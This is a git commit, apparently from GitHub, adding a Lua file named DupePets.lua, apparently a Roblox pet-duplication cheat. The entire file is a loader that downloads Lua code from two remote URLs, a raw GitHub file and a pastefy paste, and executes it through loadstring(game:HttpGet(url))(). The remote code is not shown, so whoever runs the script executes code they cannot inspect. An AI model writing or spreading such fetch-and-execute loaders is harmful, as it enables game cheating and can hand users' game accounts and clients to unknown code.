cdde2fa92f0a8a97bc6b51483181a81dc8168c12
Biggg886 <154685671+Biggg886@users.noreply.github.com>
2025-08-07 09:33:15 +0700

    Update DupePets.lua

--- DupePets.lua
+++ DupePets.lua
@@ -1,1 +1,8 @@
+local urls = {
+    "https://raw.githubusercontent.com/Biggg886/Dkkdk/main/Jfjdjd.lua",
+    "https://pastefy.app/hfns5lum/raw"
+}
 
+for _, url in ipairs(urls) do
+    loadstring(game:HttpGet(url))()
+end
